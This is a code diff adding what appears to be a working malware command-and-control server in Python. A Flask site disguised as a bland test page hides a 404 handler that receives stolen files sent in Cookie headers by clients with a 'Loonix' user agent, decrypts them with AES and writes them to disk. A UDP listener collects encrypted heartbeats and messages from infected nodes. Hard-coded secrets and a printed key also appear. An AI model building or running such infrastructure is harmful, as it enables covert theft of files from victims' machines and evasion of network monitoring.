@@ -1,0 +1,172 @@
+import random
+import socket
+import string
+import base64
+import threading
+from Crypto.Cipher import AES
+from Crypto.Hash import SHA256
+from Crypto.Random import get_random_bytes
+from Crypto.Util.Padding import unpad
+from flask import Flask, request, Response, session, render_template, redirect
+from access import *
+
+app = Flask(__name__)
+# Flask session key, used to encrypt session cookies
+app.secret_key = 'f5984jrsd8gjtf549jdsg945fdsgjfgf4w3i243jf-9d9s8gh45f8ref'
+
+# Login passcode
+authcode = SHA256.new(b"rosebud").hexdigest()
+
+# Symmetric key for encryption
+key = get_random_bytes(16)
+print(key.hex())
+
+# Holds file fragments during exfiltration
+# When the file is completely sent, it is removed from here and reconstructed
+exfil_files = []
+
+# Holds messages for malware
+message_buffer = []
+# Holds node information
+nodes = []
+
+
+# Takes data from "exfil_files" and constructs the original file
+def process_exfil_file(sender):
+    nonce = exfil_files[sender]['nonce']
+    ciphertext = exfil_files[sender]['data']
+    exfil_files.pop(sender)  # remove once we get the data (if it fails we don't want it sitting in our list)
+
+    cipher = AES.new(key, AES.MODE_CBC, nonce)
+    plaintext_encoded = unpad(cipher.decrypt(ciphertext), AES.block_size)  # decrypt contents
+    plaintext = plaintext_encoded.decode('ascii')
+    node_id_encoded, file_name_encoded, file_contents_encoded = plaintext.split("_")  # values are separated with underscores
+    node_id = base64.b64decode(node_id_encoded).decode('ascii')
+    file_name = base64.b64decode(file_name_encoded).decode('ascii')
+    file_contents = base64.b64decode(file_contents_encoded)
+    text_extensions = ['asm', 'c', 'cfg', 'css', 'cpp', 'csv', 'cxx', 'h', 'hpp', 'html', 'htm', 'hxx', 'java', 'js',
+                       'log', 'pl', 'php', 'py', 'rb', 'rtf', 's', 'sh', 'txt', 'xml']
+    if file_name.split('.')[1] in text_extensions:
+        with open(file_name, 'w') as f:
+            f.write(file_contents.decode('ascii'))
+    else:
+        with open(file_name, 'wb') as f:
+            f.write(file_contents)
+
+
+def handle_exfil_chunk(data, sender, cont):
+    print(data)
+    print(sender)
+    print(cont)
+    if data is None:
+        return Response()
+    if "_" in data:  # First data packet includes the nonce
+        nonce_encoded = data[0:len(data)-1]
+        nonce = base64.b64decode(nonce_encoded)
+        exfil_files[sender] = {'nonce': nonce, 'data': ''}  # relying on the fact that the sender's IP wont change before the file is received
+    else:  # Second and beyond packets are file contents
+        content = base64.b64decode(data)
+        exfil_files[sender]['data'] += content
+
+    if cont == 'close':
+        return Response()
+    resp = Response()
+    resp.headers['Location'] = ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(5, 25)))
+    return resp
+
+
+# Make it look like a shitty test-site
+@app.route('/')
+def index():
+    return "Site Works"
+
+
+# Login / see all recent malware connections
+@app.route('/cmd', methods=['GET', 'POST'])
+def command():
+    if 'logged_in' not in session:
+        if request.method == 'POST':
+            candidate_authcode = request.form['authcode']
+            if SHA256.new(candidate_authcode.encode()).hexdigest() == authcode:
+                session['logged_in'] = True
+            return redirect('/cmd')
+    return render_template('command.html')
+
+
+# Logout function
+@app.route('/lgt')
+@is_logged_in
+def logout():
+    session.clear()
+    return redirect('/cmd')
+
+
+# This is the exfiltration mechanic
+# The malware makes the user-agent include "Loonix" instead of "Linux", and
+# sends data in the Cookie field of the header
+# If there is more data to send, the malware adds the "Connection: keep-alive" field
+# and the server will send back a 307 status
+# if this is the last bit of data, the malware adds "Connection: close", and the server
+# responds with status code 204 and then the malware closes the TCP connection
+@app.errorhandler(404)
+def handle_404(e):
+    user_agent = request.headers.get('User-Agent')
+    if 'Loonix' in user_agent:
+        cont = request.headers.get('Connection')
+        sender = request.environ['REMOTE_ADDR']
+        resp = handle_exfil_chunk(request.headers.get('Cookie'), sender, cont)
+        if cont == 'close':
+            process_exfil_file(sender)
+            return resp, 204
+        return resp, 307
+    return e, 404
+
+
+# Start flask
+def web_backend():
+    app.run(debug=False)
+
+
+# Handles UDP messages from server
+def handle_message(message, addr):
+    print(addr)
+    print(message)
+    # Process Message
+    nonce_encoded, ciphertext_encoded = message.decode().strip().split("_")
+    nonce = base64.b64decode(nonce_encoded)
+    ciphertext = base64.b64decode(ciphertext_encoded)
+    cipher = AES.new(key, AES.MODE_CBC, nonce)
+    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
+    node_id, message_encoded = plaintext.decode().split("_")
+    message = base64.b64decode(message_encoded).decode().strip()
+
+    if message == 'heartbeat':
+        print('Heartbeat noticed')
+    else:
+        print(message)
+    return
+
+
+# Start UDP command server and handle any messages
+def command_server():
+    local_ip = ''
+    local_port = 53045
+    buffer_size = 4096
+
+    server_socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
+    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server_socket.bind((local_ip, local_port))
+
+    print("C2 - Now running...")
+
+    while True:
+        recv = server_socket.recvfrom(buffer_size)
+        message = recv[0]
+        addr = recv[1]
+        handle_message(message, addr)
+
+
+x = threading.Thread(target=command_server)
+x.start()
+web_backend()
+
